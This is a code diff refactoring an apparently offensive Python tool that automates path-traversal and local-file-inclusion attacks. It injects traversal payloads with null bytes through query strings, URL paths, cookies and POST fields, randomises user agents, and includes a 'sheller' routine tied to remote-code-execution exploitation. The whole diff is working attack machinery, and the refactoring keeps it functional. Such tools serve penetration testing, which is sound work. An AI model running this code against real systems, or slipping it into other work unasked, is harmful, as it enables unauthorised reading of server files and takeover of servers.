@@ -87,6 +87,118 @@ def query(traverse, dir, file, nb, keyword, url, url2, s):
     return (prep, p)
 
 
+def fixURL(url, attack):
+    """
+    reformat potentially misformated URLs to the attack expectations.
+    @params:
+        url: URL to format
+        attack: attack ID being executed
+    @return: the fixed URL
+    """
+    # resolve issues with inpath attack
+    if attack == 2:
+        # only root directory, else false positives
+        splitted = url.split("://")
+        ulist = splitted[1].split("/")
+        last = ulist[-1]
+        # delete file, but not hidden directory
+        if "." in last and not last.startswith(".") and last != ulist[0]:
+            del ulist[-1]
+        url = splitted[0] + "://" + "/".join(ulist)
+    if not url.endswith("/"):
+        url += "/"
+
+    return url
+
+
+def initialPing(s, attack, url, url2, keyword, timeout):
+    """
+    performs the initial requests needed for the vulnerability analysis.
+    @params:
+        s: session object with saved state
+        attack: attack mode
+        url: URL part 1
+        url2: URL part 2 (for attack = 1)
+        keyword: GET Parameter for attack = 1
+        timeout: request timeout
+    @return: response contents for later analysis
+    """
+    # initial ping for filecheck
+    if attack != 4:
+        try:
+            con2 = s.get(url, timeout=timeout).content
+        except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
+            sys.exit("Timeout on initial check.")
+    else:
+        try:
+            con2 = s.post(url, data={}, timeout=timeout).content
+        except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
+            sys.exit("Timeout on initial check.")
+
+    con3 = None
+    if attack == 1:
+        try:
+            con3 = s.get(url + "?" + keyword + "=vailyn" + url2, timeout=timeout).content
+        except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
+            sys.exit("Timeout on initial check.")
+
+    return (con2, con3)
+
+
+def attackRequest(s, attack, url, url2, keyword, selected, traverse, file, directory, nullbyte,
+                  postdata, timeout, phase2=False, sheller=False):
+    """
+    This method executes the attack request and returns the result to the caller.
+    @params:
+        # see caller functions
+        phase2: adapt return value to Phase 2
+        sheller: adapt return value to the RCE exploitation module
+    @return: tuple of useful information, varies by caller
+    """
+    requestlist = []
+    data = {}
+    if attack == 1:
+        prep, p = query(traverse, directory, file, nullbyte, keyword, url, url2, s)
+        random_ua(s)
+        r = s.send(prep, timeout=timeout)
+    elif attack == 2:
+        prep, p = inpath(traverse, directory, file, nullbyte, url, url2, s)
+        random_ua(s)
+        r = s.send(prep, timeout=timeout)
+    elif attack == 3:
+        s.cookies.set(selected, traverse + directory + file + nullbyte)
+        p = traverse + directory + file + nullbyte
+        random_ua(s)
+        r = s.get(url, timeout=timeout)
+    elif attack == 4:
+        p = traverse + directory + file + nullbyte
+        for prop in postdata.split("&"):
+            pair = prop.split("=")
+            if pair[1].strip() == "INJECT":
+                pair[1] = p
+            data[pair[0].strip()] = pair[1].strip()
+        assert data != {}
+        random_ua(s)
+        req = requests.Request(method='POST', url=url, data=data)
+        prep = s.prepare_request(req)
+        newBody = unquote(prep.body)
+        prep.body = newBody
+        prep.headers["content-length"] = len(newBody)
+        r = s.send(prep, timeout=timeout)
+
+    try:
+        if phase2:
+            requestlist.append((r, p, data))
+        elif sheller:
+            requestlist.append((r, p, nullbyte, data, traverse))
+        else:
+            requestlist.append((r, p, nullbyte))
+    except Exception:
+        pass
+
+    return requestlist
+
+
 def phase1(attack, url, url2, keyword, cookie, selected, verbose, depth, paylist, file, authcookie,
            postdata, gui):
     """
@@ -108,7 +220,10 @@ def phase1(attack, url, url2, keyword, cookie, selected, verbose, depth, paylist
     """
     # variables for the progress counter
     global requestcount
-    totalrequests = len(payloadlist) * (len(nullchars) + 1) * (depth)
+    precise = vars.precise
+    totalrequests = len(payloadlist) * (len(nullchars) + 1)
+    if not precise:
+        totalrequests = totalrequests * (depth)
     timeout = vars.timeout
     if gui:
         lock.acquire()
@@ -119,18 +234,7 @@ def phase1(attack, url, url2, keyword, cookie, selected, verbose, depth, paylist
         finally:
             lock.release()
 
-    # resolve issues with inpath attack
-    if attack == 2:
-        # only root directory, else false positives
-        splitted = url.split("://")
-        ulist = splitted[1].split("/")
-        last = ulist[-1]
-        # delete file, but not hidden directory
-        if "." in last and not last.startswith(".") and last != ulist[0]:
-            del ulist[-1]
-        url = splitted[0] + "://" + "/".join(ulist)
-    if not url.endswith("/"):
-        url += "/"
+    url = fixURL(url, attack)
 
     # initialize lists & session
     payloads = []
@@ -142,28 +246,15 @@ def phase1(attack, url, url2, keyword, cookie, selected, verbose, depth, paylist
         for cookie in tmpjar:
             s.cookies.set_cookie(cookie)
 
-    # initial ping for filecheck
-    if attack != 4:
-        try:
-            con2 = s.get(url, timeout=timeout).content
-        except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
-            sys.exit("Timeout on initial check.")
-    else:
-        try:
-            con2 = s.post(url, data={}, timeout=timeout).content
-        except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
-            sys.exit("Timeout on initial check.")
-
-    con3 = None
-    if attack == 1:
-        try:
-            con3 = s.get(url + "?" + keyword + "=vailyn" + url2, timeout=timeout).content
-        except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
-            sys.exit("Timeout on initial check.")
+    con2, con3 = initialPing(s, attack, url, url2, keyword, timeout)
 
     for i in paylist:
-        d = 1
-        while d <= depth:
+        if precise:
+            layers = [depth]
+        else:
+            layers = list(range(1, depth + 1))
+
+        for d in layers:
             traverse = ''
             j = 1
             # chain traversal payloads
@@ -173,103 +264,22 @@ def phase1(attack, url, url2, keyword, cookie, selected, verbose, depth, paylist
 
             # send attack requests - no nullbyte injection
             requestlist = []
-            if attack == 1:
-                prep, p = query(traverse, "", file, "", keyword, url, url2, s)
-                try:
-                    random_ua(s)
-                    r = s.send(prep, timeout=timeout)
-                except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
-                    print("Timeout reached for " + url)
-            elif attack == 2:
-                prep, p = inpath(traverse, "", file, "", url, url2, s)
-                try:
-                    random_ua(s)
-                    r = s.send(prep, timeout=timeout)
-                except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
-                    print("Timeout reached for " + url)
-            elif attack == 3:
-                s.cookies.set(selected, traverse + file)
-                p = traverse + file
-                try:
-                    random_ua(s)
-                    r = s.get(url, timeout=timeout)
-                except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
-                    print("Timeout reached for " + url)
-            elif attack == 4:
-                p = traverse + file
-                data = {}
-                for prop in postdata.split("&"):
-                    pair = prop.split("=")
-                    if pair[1].strip() == "INJECT":
-                        pair[1] = p
-                    data[pair[0].strip()] = pair[1].strip()
-                assert data != {}
-                try:
-                    random_ua(s)
-                    req = requests.Request(method='POST', url=url, data=data)
-                    prep = s.prepare_request(req)
-                    newBody = unquote(prep.body)
-                    prep.body = newBody
-                    prep.headers["content-length"] = len(newBody)
-                    r = s.send(prep, timeout=timeout)
-                except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
-                    print("Timeout reached for " + url)
             try:
-                requestlist.append((r, p, ""))
-            except Exception:
-                pass
+                requestlist += attackRequest(
+                    s, attack, url, url2, keyword, selected, traverse, file, "", "", postdata, timeout
+                )
+            except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
+                print("Timeout reached for " + url)
 
             # repeat for nullbytes
             for nb in nullchars:
-                if attack == 1:
-                    prep, p = query(traverse, "", file, nb, keyword, url, url2, s)
-                    try:
-                        random_ua(s)
-                        r = s.send(prep, timeout=timeout)
-                    except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
-                        print("Timeout reached for " + url)
-                        continue
-                elif attack == 2:
-                    prep, p = inpath(traverse, "", file, nb, url, url2, s)
-                    try:
-                        random_ua(s)
-                        r = s.send(prep, timeout=timeout)
-                    except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
-                        print("Timeout reached for " + url)
-                        continue
-                elif attack == 3:
-                    s.cookies.set(selected, traverse + file + nb)
-                    p = traverse + file + nb
-                    try:
-                        random_ua(s)
-                        r = s.get(url, timeout=timeout)
-                    except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
-                        print("Timeout reached for " + url)
-                        continue
-                elif attack == 4:
-                    p = traverse + file + nb
-                    data = {}
-                    for prop in postdata.split("&"):
-                        pair = prop.split("=")
-                        if pair[1].strip() == "INJECT":
-                            pair[1] = p
-                        data[pair[0].strip()] = pair[1].strip()
-                    assert data != {}
-                    try:
-                        random_ua(s)
-                        req = requests.Request(method='POST', url=url, data=data)
-                        prep = s.prepare_request(req)
-                        newBody = unquote(prep.body)
-                        prep.body = newBody
-                        prep.headers["content-length"] = len(newBody)
-                        r = s.send(prep, timeout=timeout)
-                    except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
-                        print("Timeout reached for " + url)
-                        continue
                 try:
-                    requestlist.append((r, p, nb))
-                except Exception:
-                    pass
+                    requestlist += attackRequest(
+                        s, attack, url, url2, keyword, selected, traverse, file, "", nb, postdata,
+                        timeout
+                    )
+                except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
+                    print("Timeout reached for " + url)
 
             # analyze result
             found = False
@@ -303,7 +313,7 @@ def phase1(attack, url, url2, keyword, cookie, selected, verbose, depth, paylist
                         print(color.END + "{}|: ".format(r.status_code)+r.url)
                     elif attack == 3 or attack == 4:
                         print(color.END + "{}|: ".format(r.status_code)+r.url + " : " + p)
-            d += 1
+
             if found:
                 break
 
@@ -351,18 +361,7 @@ def phase2(attack, url, url2, keyword, cookie, selected, filespath, dirs, depth,
         finally:
             lock.release()
 
-    # resolve issues with inpath attack and loot function
-    if attack == 2:
-        # only root directory, else false positives
-        splitted = url.split("://")
-        ulist = splitted[1].split("/")
-        last = ulist[-1]
-        # delete file, but not hidden directory
-        if "." in last and not last.startswith(".") and last != ulist[0]:
-            del ulist[-1]
-        url = splitted[0] + "://" + "/".join(ulist)
-    if not url.endswith("/"):
-        url += "/"
+    url = fixURL(url, attack)
 
     # initialize lists & session
     found = []
@@ -374,24 +373,7 @@ def phase2(attack, url, url2, keyword, cookie, selected, filespath, dirs, depth,
         for cookie in tmpjar:
             s.cookies.set_cookie(cookie)
 
-    # initial ping for filecheck
-    if attack != 4:
-        try:
-            con2 = s.get(url, timeout=timeout).content
-        except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
-            sys.exit("Timeout on initial check.")
-    else:
-        try:
-            con2 = s.post(url, data={}, timeout=timeout).content
-        except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
-            sys.exit("Timeout on initial check.")
-
-    con3 = None
-    if attack == 1:
-        try:
-            con3 = s.get(url + "?" + keyword + "=vailyn" + url2, timeout=timeout).content
-        except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
-            sys.exit("Timeout on initial check.")
+    con2, con3 = initialPing(s, attack, url, url2, keyword, timeout)
 
     try:
         for dir in dirs:
@@ -410,106 +392,24 @@ def phase2(attack, url, url2, keyword, cookie, selected, filespath, dirs, depth,
                         # send attack requests - with or without nullbyte injection
                         requestlist = []
                         if selected_nullbytes == []:
-                            data = {}
-                            if attack == 1:
-                                prep, p = query(traverse, dir, file, "", keyword, url, url2, s)
-                                try:
-                                    random_ua(s)
-                                    r = s.send(prep, timeout=timeout)
-                                except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
-                                    print("Timeout reached for " + url)
-                                    continue
-                            elif attack == 2:
-                                prep, p = inpath(traverse, dir, file, "", url, url2, s)
-                                try:
-                                    random_ua(s)
-                                    r = s.send(prep, timeout=timeout)
-                                except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
-                                    print("Timeout reached for " + url)
-                                    continue
-                            elif attack == 3:
-                                p = traverse + dir + file
-                                s.cookies.set(selected, traverse + dir + file)
-                                try:
-                                    random_ua(s)
-                                    r = s.get(url, timeout=timeout)
-                                except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
-                                    print("Timeout reached for " + url)
-                                    continue
-                            elif attack == 4:
-                                p = traverse + dir + file
-                                for prop in postdata.split("&"):
-                                    pair = prop.split("=")
-                                    if pair[1].strip() == "INJECT":
-                                        pair[1] = p
-                                    data[pair[0].strip()] = pair[1].strip()
-                                assert data != {}
-                                try:
-                                    random_ua(s)
-                                    req = requests.Request(method='POST', url=url, data=data)
-                                    prep = s.prepare_request(req)
-                                    newBody = unquote(prep.body)
-                                    prep.body = newBody
-                                    prep.headers["content-length"] = len(newBody)
-                                    r = s.send(prep, timeout=timeout)
-                                except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
-                                    print("Timeout reached for " + url)
-                                    continue
                             try:
-                                requestlist.append((r, p, data))
-                            except Exception:
-                                pass
+                                requestlist += attackRequest(
+                                    s, attack, url, url2, keyword, selected, traverse, file, dir, "",
+                                    postdata, timeout, phase2=True
+                                )
+                            except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
+                                print("Timeout reached for " + url)
+                                continue
                         else:
                             for nb in selected_nullbytes:
-                                data = {}
-                                if attack == 1:
-                                    prep, p = query(traverse, dir, file, nb, keyword, url, url2, s)
-                                    try:
-                                        random_ua(s)
-                                        r = s.send(prep, timeout=timeout)
-                                    except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
-                                        print("Timeout reached for " + url)
-                                        continue
-                                elif attack == 2:
-                                    prep, p = inpath(traverse, dir, file, nb, url, url2, s)
-                                    try:
-                                        random_ua(s)
-                                        r = s.send(prep, timeout=timeout)
-                                    except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
-                                        print("Timeout reached for " + url)
-                                        continue
-                                elif attack == 3:
-                                    p = traverse + dir + file + nb
-                                    s.cookies.set(selected, traverse + dir + file + nb)
-                                    try:
-                                        random_ua(s)
-                                        r = s.get(url, timeout=timeout)
-                                    except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
-                                        print("Timeout reached for " + url)
-                                        continue
-                                elif attack == 4:
-                                    p = traverse + dir + file + nb
-                                    for prop in postdata.split("&"):
-                                        pair = prop.split("=")
-                                        if pair[1].strip() == "INJECT":
-                                            pair[1] = p
-                                        data[pair[0].strip()] = pair[1].strip()
-                                    assert data != {}
-                                    try:
-                                        random_ua(s)
-                                        req = requests.Request(method='POST', url=url, data=data)
-                                        prep = s.prepare_request(req)
-                                        newBody = unquote(prep.body)
-                                        prep.body = newBody
-                                        prep.headers["content-length"] = len(newBody)
-                                        r = s.send(prep, timeout=timeout)
-                                    except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
-                                        print("Timeout reached for " + url)
-                                        continue
                                 try:
-                                    requestlist.append((r, p, data))
-                                except Exception:
-                                    pass
+                                    requestlist += attackRequest(
+                                        s, attack, url, url2, keyword, selected, traverse, file, dir, nb,
+                                        postdata, timeout, phase2=True
+                                    )
+                                except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
+                                    print("Timeout reached for " + url)
+                                    continue
 
                         # analyze result
                         for (r, p, data) in requestlist:
@@ -597,18 +497,7 @@ def sheller(technique, attack, url, url2, keyword, cookie, selected, verbose, pa
         others - see phase1()
     """
     # TODO clean me up
-    # resolve issues with inpath attack
-    if attack == 2:
-        # only root directory, else false positives
-        splitted = url.split("://")
-        ulist = splitted[1].split("/")
-        last = ulist[-1]
-        # delete file, but not hidden directory
-        if "." in last and not last.startswith(".") and last != ulist[0]:
-            del ulist[-1]
-        url = splitted[0] + "://" + "/".join(ulist)
-    if not url.endswith("/"):
-        url += "/"
+    url = fixURL(url, attack)
 
     s = session()
     timeout = vars.timeout
@@ -634,24 +523,7 @@ def sheller(technique, attack, url, url2, keyword, cookie, selected, verbose, pa
         for cookie in tmpjar:
             s.cookies.set_cookie(cookie)
 
-    # initial ping for filecheck
-    if attack != 4:
-        try:
-            con2 = s.get(url, timeout=timeout).content
-        except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
-            sys.exit("Timeout on initial check.")
-    else:
-        try:
-            con2 = s.post(url, data={}, timeout=timeout).content
-        except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
-            sys.exit("Timeout on initial check.")
-
-    con3 = None
-    if attack == 1:
-        try:
-            con3 = s.get(url + "?" + keyword + "=vailyn" + url2, timeout=timeout).content
-        except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
-            sys.exit("Timeout on initial check.")
+    con2, con3 = initialPing(s, attack, url, url2, keyword, timeout)
 
     if technique != 6:
         for i in paylist:
@@ -667,102 +539,23 @@ def sheller(technique, attack, url, url2, keyword, cookie, selected, verbose, pa
                 # send attack requests - no nullbyte injection
                 requestlist = []
                 if nullist == []:
-                    data = {}
-                    if attack == 1:
-                        prep, p = query(traverse, "", file, "", keyword, url, url2, s)
-                        try:
-                            random_ua(s)
-                            r = s.send(prep, timeout=timeout)
-                        except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
-                            print("Timeout reached for " + url)
-                    elif attack == 2:
-                        prep, p = inpath(traverse, "", file, "", url, url2, s)
-                        try:
-                            random_ua(s)
-                            r = s.send(prep, timeout=timeout)
-                        except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
-                            print("Timeout reached for " + url)
-                    elif attack == 3:
-                        s.cookies.set(selected, traverse + file)
-                        p = traverse + file
-                        try:
-                            random_ua(s)
-                            r = s.get(url, timeout=timeout)
-                        except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
-                            print("Timeout reached for " + url)
-                    elif attack == 4:
-                        p = traverse + file
-                        for prop in postdata.split("&"):
-                            pair = prop.split("=")
-                            if pair[1].strip() == "INJECT":
-                                pair[1] = p
-                            data[pair[0].strip()] = pair[1].strip()
-                        assert data != {}
-                        try:
-                            random_ua(s)
-                            req = requests.Request(method='POST', url=url, data=data)
-                            prep = s.prepare_request(req)
-                            newBody = unquote(prep.body)
-                            prep.body = newBody
-                            prep.headers["content-length"] = len(newBody)
-                            r = s.send(prep, timeout=timeout)
-                        except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
-                            print("Timeout reached for " + url)
                     try:
-                        requestlist.append((r, p, "", data, traverse))
-                    except Exception:
-                        pass
+                        requestlist += attackRequest(
+                            s, attack, url, url2, keyword, selected, traverse, file, "", "",
+                            postdata, timeout, sheller=True
+                        )
+                    except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
+                        print("Timeout reached for " + url)
                 else:
                     for nb in nullist:
-                        data = {}
-                        if attack == 1:
-                            prep, p = query(traverse, "", file, "", keyword, url, url2, s)
-                            try:
-                                random_ua(s)
-                                r = s.send(prep, timeout=timeout)
-                            except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
-                                print("Timeout reached for " + url)
-                                continue
-                        elif attack == 2:
-                            prep, p = inpath(traverse, "", file, "", url, url2, s)
-                            try:
-                                random_ua(s)
-                                r = s.send(prep, timeout=timeout)
-                            except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
-                                print("Timeout reached for " + url)
-                                continue
-                        elif attack == 3:
-                            s.cookies.set(selected, traverse + file)
-                            p = traverse + file
-                            try:
-                                random_ua(s)
-                                r = s.get(url, timeout=timeout)
-                            except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
-                                print("Timeout reached for " + url)
-                                continue
-                        elif attack == 4:
-                            p = traverse + file
-                            for prop in postdata.split("&"):
-                                pair = prop.split("=")
-                                if pair[1].strip() == "INJECT":
-                                    pair[1] = p
-                                data[pair[0].strip()] = pair[1].strip()
-                            assert data != {}
-                            try:
-                                random_ua(s)
-                                req = requests.Request(method='POST', url=url, data=data)
-                                prep = s.prepare_request(req)
-                                newBody = unquote(prep.body)
-                                prep.body = newBody
-                                prep.headers["content-length"] = len(newBody)
-                                r = s.send(prep, timeout=timeout)
-                            except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
-                                print("Timeout reached for " + url)
-                                continue
                         try:
-                            requestlist.append((r, p, "", data, traverse))
-                        except Exception:
-                            pass
+                            requestlist += attackRequest(
+                                s, attack, url, url2, keyword, selected, traverse, file, "", nb,
+                                postdata, timeout, sheller=True
+                            )
+                        except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
+                            print("Timeout reached for " + url)
+                            continue
 
                 # analyze result
                 found = False
